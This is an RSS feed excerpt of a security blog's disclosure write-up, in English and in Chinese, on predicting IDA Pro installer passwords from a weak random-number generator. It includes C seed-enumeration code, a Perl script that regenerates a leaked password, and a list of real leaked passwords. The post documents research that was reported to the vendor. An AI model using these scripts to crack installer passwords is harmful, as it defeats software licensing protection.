&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a month, we finally generated the IDA Pro installation passwords successfully with Perl, and the correct charset ordering is &lt;code class=&quot;highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;. For example, we can generate the hacking team’s leaked password &lt;code class=&quot;highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt; with the following script:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$i $pw\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this, we can build a dictionary of installation password, which effectively increase the efficiency of brute force attack. Generally, we can compute the password of one installer in 10 minutes.&lt;/p&gt;

&lt;p&gt;We have reported this issue to Hex-Rays, and they promised to harden the installation password immediately.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;In this article, we discussed the possibility of installing IDA Pro without owning installation password. In the end, we found plaintext password in the program memory of Linux and MacOS version. On the other hand, we determined the password generation methodology of Windows version. Therefore, we can build a dictionary to accelerate brute force attack. Finally, we can get one password at a reasonable time.&lt;/p&gt;

&lt;p&gt;We really enjoy this process: surmise wisely and prove it with our best. It can broaden our experience no matter the result is correct or not. This is why we took a whole month to verify such a difficult surmise. We also take this attitude in our &lt;a href=&quot;https://devco.re/en/services/red-team&quot;&gt;Red Team Assessment&lt;/a&gt;. You would love to give it a try!&lt;/p&gt;

&lt;p&gt;Lastly, we would like to thank for the friendly and rapid response from Hex-Rays. Although this issue is not included in &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt;, they still generously awarded us IDA Pro Linux and MAC version, and upgraded the Windows version for us. We really appreciate it.&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - Report to Hex-Rays&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays promised to harden the installation password and reported to BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock released InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>破密行動: 以不尋常的角度破解 IDA Pro 偽隨機數</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;Hex-Rays IDA Pro 是目前世界上最知名的反組譯工具，今天我們想來聊聊它的安裝密碼。什麼是安裝密碼？一般來說，在完成 IDA Pro 購買流程後，會收到一個客製化安裝檔及安裝密碼，在程式安裝過程中，會需要那組安裝密碼才得以繼續安裝。那麼，如果今天在網路上發現一包洩漏的 IDA Pro 安裝檔，我們有可能在不知道密碼的狀況下順利安裝嗎？這是一個有趣的開放性問題。&lt;/p&gt;

&lt;p&gt;在我們團隊成員腦力激盪下，給出了一個驗證性的答案：是的，在有 Linux 或 MacOS 版安裝檔的狀況下，我們可以直接找到正確的安裝密碼；而在有 Windows 版安裝檔的狀況下，我們只需要十分鐘就可算出安裝密碼。&lt;/p&gt;

&lt;p&gt;下面就是我們的驗證流程：&lt;/p&gt;

&lt;h3 id=&quot;-linux-以及-macos-版&quot;&gt;* Linux 以及 MacOS 版&lt;/h3&gt;

&lt;p&gt;最先驗證成功的是 Linux 及 MacOS 版，這兩個版本都是透過 InstallBuilder 封裝成安裝檔。我們嘗試執行安裝程式，並在記憶體中直接發現了未加密的安裝密碼。任務達成！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在透過 Hex-Rays 協助回報後，&lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; 也在 2019/02/11 釋出了 InstallBuilder 19.2.0，加強了安裝密碼的保護。&lt;/p&gt;

&lt;h3 id=&quot;-windows-版&quot;&gt;* Windows 版&lt;/h3&gt;

&lt;p&gt;在 Windows 版上解決這個問題是項挑戰，因為這個安裝檔是透過 &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt; 封裝的，其安裝密碼是採用 &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt; 的方式儲存，因此我們無法透過靜態、動態程式分析直接取得密碼，透過暴力列舉也不是一個有效率的方式。不過，如果我們掌握了產生密碼的方式，那結果可能就不一樣了，我們也許可以更有效率的窮舉。&lt;/p&gt;

&lt;p&gt;雖然我們已經有了方向是要找出 Hex-Rays 如何產生密碼，但要去驗證卻是”非常困難”的。因為我們不知道亂數產生器是用什麼語言實作的，而目前已知至少有 &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 種亂數產生器&lt;/a&gt;，種類太多了。同時，我們也無法知道亂數產生器所使用的字元組和字元順序是什麼。&lt;/p&gt;

&lt;p&gt;要找出亂數產生器所使用的字元組是眾多困難事中比較簡單的一件，首先，我們竭盡所能的收集所有 IDA Pro 的安裝密碼，例如 WikiLeaks 所揭露的 hackingteam 使用之密碼：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;從所有收集到的安裝密碼中我們整理出所用到的字元組：&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;少了 &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; 字元，推測這些都是容易混淆的字元，因此不放入密碼字元組中是合理的。接著，我們用這些字元組，猜測可能的排列順序：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後，我們挑選幾個比較常見的語言（c/php/python/perl）並使用上述的字元組實作亂數產生器，列舉所有亂數組合，看看我們收集到的安裝密碼有沒有出現在這些組合中。例如我們用下面程式碼列舉 C 語言的亂數組合：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
